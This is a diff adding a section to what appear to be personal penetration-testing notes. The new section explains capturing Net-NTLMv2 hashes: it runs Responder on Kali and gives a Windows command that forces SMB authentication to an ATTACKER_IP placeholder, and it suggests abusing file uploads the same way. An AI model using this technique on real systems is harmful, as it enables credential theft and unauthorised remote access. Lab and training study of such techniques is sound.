@@ -114,3 +114,18 @@ ssh2john id_rsa
 Which, again, will prefix with the filename `id_rsa:` which should be removed before giving it to hashcat.
 
 
+## Get Net-NTLMv2 hash from a shell
+
+pre-req for this is that the running is allowed to RDP so we can access the user once the NTLMv2 hash is cracked.
+check this by doing `net user $username` in the shell.
+If the user is in Remote Desktop Users, we are good.
+
+On kali, set up responder on the network interface (usually `tun0`):
+
+```
+sudo responder -I tun0
+```
+
+Now, from the Windows shell, do something like `dir \\${ATTACKER_IP}\thiswillgetdenied`.
+
+Note that if you can get a windows server to access such an SMB path remotely, this trick can also be abused via e.g. fileuploads
